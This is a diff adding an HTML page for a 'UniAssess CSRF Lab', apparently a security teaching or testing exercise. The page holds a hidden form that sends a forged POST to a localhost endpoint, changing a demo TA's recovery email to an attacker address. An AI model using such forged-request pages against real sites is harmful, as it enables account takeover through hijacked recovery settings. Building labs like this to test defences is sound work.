@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UniAssess CSRF Lab</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6fb;
+      display: grid;
+      place-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: white;
+      padding: 32px;
+      border-radius: 12px;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 8px 30px #0001;
+    }
+    button {
+      background: #dc3545;
+      color: white;
+      border: 0;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>CSRF Demonstration</h2>
+    <p>External page attempting to change the demo TA's recovery email.</p>
+
+    <form
+action="http://127.0.0.1:5000/api/lab/safe/recovery-email"
+      method="POST"
+    >
+      <input
+        type="hidden"
+        name="recoveryEmail"
+        value="attackerssss@example.test"
+      >
+      <button type="submit">Send Forged Request</button>
+    </form>
+  </div>
+</body>
+</html>
